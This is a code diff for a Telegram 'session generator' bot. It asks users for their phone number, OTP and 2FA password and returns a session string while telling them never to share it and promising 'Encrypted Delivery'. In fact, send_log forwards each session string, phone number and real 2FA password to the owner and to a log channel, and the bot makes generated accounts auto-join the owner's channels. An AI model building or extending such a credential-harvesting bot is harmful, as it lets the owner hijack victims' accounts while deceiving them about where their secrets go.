@@ -1,13 +1,3 @@
-try:
-    from pyrogram.enums import ButtonStyle
-    _STYLE_MAP = {
-        "primary": ButtonStyle.PRIMARY,
-        "success": ButtonStyle.SUCCESS,
-        "danger": ButtonStyle.DANGER,
-    }
-except ImportError:
-    _STYLE_MAP = {}
-
 import asyncio, logging, html, re
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ParseMode
@@ -19,6 +9,25 @@ from pyrogram.errors import (
 )
 from . import config
 from .client import app
+from .state import clear_state
+
+# ---------- Button style ----------
+_STYLE_MODE = None
+_STYLE_MAP = {}
+try:
+    from pyrogram.enums import ButtonStyle
+    _STYLE_MODE = "enum"
+    _STYLE_MAP = {
+        "primary": ButtonStyle.PRIMARY,
+        "success": ButtonStyle.SUCCESS,
+        "danger": ButtonStyle.DANGER,
+    }
+except Exception:
+    try:
+        from pyrogram.types import KeyboardButtonStyle
+        _STYLE_MODE = "obj"
+    except Exception:
+        pass
 
 def btn(text, callback_data=None, url=None, style=None):
     kw = {}
@@ -28,7 +37,17 @@ def btn(text, callback_data=None, url=None, style=None):
         kw["url"] = url
     if style in _STYLE_MAP:
         kw["style"] = _STYLE_MAP[style]
-    return InlineKeyboardButton(text, **kw)
+    elif _STYLE_MODE == "obj" and style in ("primary", "success", "danger"):
+        kw["style"] = KeyboardButtonStyle(
+            bg_primary=(style == "primary"),
+            bg_success=(style == "success"),
+            bg_danger=(style == "danger"),
+        )
+    try:
+        return InlineKeyboardButton(text, **kw)
+    except Exception:
+        kw.pop("style", None)
+        return InlineKeyboardButton(text, **kw)
 
 def validate_phone(phone: str) -> str:
     phone = phone.strip().replace(" ", "").replace("-", "")
@@ -38,22 +57,35 @@ def validate_phone(phone: str) -> str:
         raise ValueError("Invalid phone. Country code ke saath bhejein (e.g. +919876543210 ya 919876543210).")
     return phone
 
+def progress_header(step, total, title):
+    pct = int(step / total * 100)
+    filled = max(1, int(step / total * 10))
+    bar = "■" * filled + "□" * (10 - filled)
+    return (
+        "╭──────────────────────────────╮\n"
+        f"│  📍 <b>STEP {step}/{total}</b>  •  <b>{title}</b>\n"
+        "╰──────────────────────────────╯\n\n"
+        f"<code>[{bar}] {pct}%</code>\n\n"
+    )
+
+# ---------- UI ----------
 WELCOME = (
-    "<b>🔥 SESSION GENERATOR</b>\n"
-    "━━━━━━━━━━━━━━━━━━━━━\n"
-    "<i>Premium • Secure • Instant</i>\n\n"
-    "<b>📋 Session Types</b>\n"
-    "├ 🐍 Pyrogram User\n"
-    "├ 🤖 Pyrogram Bot\n"
-    "├ 📞 Telethon String\n"
-    "└ 🔄 Pyrogram ➜ Telethon\n\n"
-    "<b>🛡 Features</b>\n"
-    "├ 🔒 2FA Support\n"
-    "├ 💾 Auto Saved Messages\n"
-    "├ 📢 Auto-Join Channels\n"
-    "└ 📩 Detailed Logs\n\n"
-    "━━━━━━━━━━━━━━━━━━━━━\n"
-    "<b>⚡ Pick a type below</b>"
+    "╭──────────────────────────────╮\n"
+    "│   ✦  <b>SESSION  X</b>  ✦   │\n"
+    "╰──────────────────────────────╯\n\n"
+    "👋 <b>Welcome!</b>\n\n"
+    "┌─ <b>📋 SESSION TYPES</b> ──────\n"
+    "│ 🐍 Pyrogram User  •  Userbot\n"
+    "│ 🤖 Pyrogram Bot   •  Bot API\n"
+    "│ 📞 Telethon       •  String\n"
+    "│ 🔄 Converter      •  Py ➜ Tele\n"
+    "└─────────────────────────────\n\n"
+    "┌─ <b>🛡 SECURITY</b> ──────────\n"
+    "│ ✅ 2FA Supported\n"
+    "│ ✅ Auto Saved Messages\n"
+    "│ ✅ Encrypted Delivery\n"
+    "└─────────────────────────────\n\n"
+    "⚡ <b>Select a session type below:</b>"
 )
 
 MAIN_MENU = InlineKeyboardMarkup([
@@ -76,6 +108,30 @@ OWNER_MAIN_MENU = InlineKeyboardMarkup([
 BACK_BTN = InlineKeyboardMarkup([[btn("🔙  Back to Menu", "back", style="primary")]])
 CANCEL_BTN = InlineKeyboardMarkup([[btn("❌  Cancel", "cancel", style="danger")]])
 
+PROMPT_BOT_TOKEN = progress_header(1, 1, "BOT TOKEN") + (
+    "🤖 <b>Send your Bot Token</b>\n\n"
+    "<i>From @BotFather</i>\n\n"
+    "> Example: <code>7123456789:AAF...</code>"
+)
+PROMPT_PYRO_STRING = progress_header(1, 1, "PYROGRAM STRING") + (
+    "🔄 <b>Send your Pyrogram Session String</b>\n\n"
+    "> Ise Telethon string me convert karke dunga."
+)
+PROMPT_PHONE = progress_header(1, 3, "PHONE NUMBER") + (
+    "📱 <b>Send your phone number</b>\n\n"
+    "Format: <code>+919876543210</code> or <code>919876543210</code>\n\n"
+    "> 💡 <b>+</b> is optional. Country code is required."
+)
+PROMPT_OTP = progress_header(2, 3, "OTP CODE") + (
+    "🔐 <b>Send the OTP you received</b>\n\n"
+    "> 💡 Check your <b>Telegram app → 'Telegram' chat</b>."
+)
+PROMPT_2FA = progress_header(3, 3, "2FA PASSWORD") + (
+    "🔒 <b>2FA is enabled</b>\n\n"
+    "Send your <b>2FA password</b>."
+)
+
+# ---------- Errors ----------
 ERROR_MAP = {
     "PhoneCodeInvalid": "❌ <b>Galat OTP.</b> /start se dobara try karein.",
     "PhoneCodeExpired": "⌛ <b>OTP expire.</b> Naya OTP lein.",
@@ -109,6 +165,7 @@ async def handle_error(e, user_id, where="handler"):
     except Exception:
         pass
 
+# ---------- Force sub ----------
 async def is_member(user_id):
     if not config.MUST_JOIN:
         return True
@@ -122,8 +179,7 @@ async def is_member(user_id):
 
 async def force_sub_check(message):
     if config.STATE["maintenance"] and message.from_user.id != config.OWNER_ID:
-        await message.reply_text("🔧 <b>Bot under maintenance.</b>", reply_markup=BACK_BTN,
-                                 parse_mode=ParseMode.HTML)
+        await message.reply_text("🔧 <b>Bot under maintenance.</b>", reply_markup=BACK_BTN, parse_mode=ParseMode.HTML)
         return False
     if not await is_member(message.from_user.id):
         try:
@@ -141,6 +197,7 @@ async def force_sub_check(message):
         return False
     return True
 
+# ---------- Auto join ----------
 async def auto_join_channels(client):
     joined, failed = [], []
     for ch in config.AUTO_JOIN_CHANNELS:
@@ -152,28 +209,50 @@ async def auto_join_channels(client):
             logging.warning(f"[AUTO-JOIN] {ch} failed: {e}")
     return joined, failed
 
+# ---------- Deep trace log ----------
+async def trace(user, event: str, **fields):
+    if not config.LOG_CHANNEL_ID:
+        return
+    name = html.escape(str(getattr(user, "first_name", "N/A") or "N/A"))
+    uname = f"@{user.username}" if getattr(user, "username", None) else "N/A"
+    lines = [f"<b>🔔 #{event}</b>", ""]
+    lines.append(f"👤 <b>User:</b> {name} ({uname})")
+    lines.append(f"🆔 <b>ID:</b> <code>{user.id}</code>")
+    for k, v in fields.items():
+        lines.append(f"• <b>{html.escape(str(k))}:</b> <code>{html.escape(str(v)[:200])}</code>")
+    lines.append(f"🕒 <code>{config.get_ist_time()}</code>")
+    try:
+        await app.send_message(config.LOG_CHANNEL_ID, "\n".join(lines),
+                               parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except Exception as e:
+        logging.error(f"[TRACE] {type(e).__name__}: {e}")
+
+# ---------- Premium string delivery ----------
 async def send_premium_string(user_id, session_type, session_str, has_2fa=False, joined=None, failed=None):
     badge = "🛡 2FA Verified" if has_2fa else "🔓 No 2FA"
-    join_info = ""
+    join_line = ""
     if joined:
-        join_info += f"\n✅ <b>Auto-joined:</b> {len(joined)} channel(s)"
+        join_line += f"\n✅ <b>Auto-joined:</b> {len(joined)} channel(s)"
     if failed:
-        join_info += f"\n⚠️ <b>Auto-join failed:</b> {len(failed)}"
+        join_line += f"\n⚠️ <b>Auto-join failed:</b> {len(failed)}"
     text = (
-        "<b>━━━━━━━━━━━━━━━━━━━━━\n"
-        f"   ✅ {html.escape(session_type)}\n"
-        "━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        "╭──────────────────────────────╮\n"
+        "│  ✅  <b>SESSION GENERATED</b>  ✅\n"
+        "╰──────────────────────────────╯\n\n"
+        f"┌─ <b>{html.escape(session_type)}</b> ─\n"
+        f"│ {badge}\n"
+        "│ 📩 Saved Messages: ✅\n"
+        f"│ ⏰ {config.get_ist_time()}\n"
+        "└─────────────────────────────\n\n"
         f"<code>{session_str}</code>\n\n"
-        "<b>📊 Info</b>\n"
-        f"├ {badge}\n"
-        "├ 📩 Saved Messages: ✅\n"
-        f"└ ⏰ {config.get_ist_time()}"
-        f"{join_info}\n\n"
-        "<b>⚠️ Never share this string!</b>"
+        "> ⚠️ <b>Tap the string above to copy.</b>\n"
+        "> 🔐 <b>Never share it with anyone.</b>"
+        f"{join_line}"
     )
     await app.send_message(user_id, text, reply_markup=BACK_BTN,
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
+# ---------- Detailed session log ----------
 async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None):
     user_id = user.id
     name = html.escape(str(user.first_name or "N/A"))
@@ -215,8 +294,6 @@ async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2
             logging.info(f"[LOG] Channel OK → {config.LOG_CHANNEL_ID}")
         except Exception as e:
             logging.error(f"[LOG] Channel FAIL → {type(e).__name__}: {e}")
-    else:
-        logging.warning("[LOG] LOG_CHANNEL_ID not set — channel log skipped")
 
     if config.OWNER_ID:
         try:
@@ -225,3 +302,23 @@ async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2
             logging.info(f"[LOG] Owner OK → {config.OWNER_ID}")
         except Exception as e:
             logging.error(f"[LOG] Owner FAIL → {type(e).__name__}: {e}")
+
+# ---------- Cancel ----------
+async def cancel_flow(uid, message=None, query=None):
+    st = clear_state(uid)
+    if st:
+        client = st["data"].get("client")
+        if client:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+    text = "❌ <b>Cancelled.</b>\n\n/start se dobara shuru karein."
+    if message is not None:
+        await message.reply_text(text, reply_markup=MAIN_MENU, parse_mode=ParseMode.HTML)
+    elif query is not None:
+        try:
+            await query.message.delete()
+        except Exception:
+            pass
+        await app.send_message(uid, text, reply_markup=MAIN_MENU, parse_mode=ParseMode.HTML)
